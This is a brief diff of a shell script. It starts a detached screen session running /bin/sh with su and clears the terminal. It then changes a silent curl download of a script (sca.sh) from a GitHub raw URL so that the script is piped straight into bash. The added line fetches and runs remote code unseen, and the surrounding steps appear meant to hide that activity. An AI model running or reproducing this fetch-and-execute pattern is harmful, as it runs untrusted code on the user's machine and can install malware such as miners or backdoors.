@@ -12,4 +12,4 @@ screen -S sesi /bin/sh -c /bin/su
 screen -ls
 clear
 screen -ls
-curl -s https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/sca.sh
+curl -s https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/sca.sh |bash
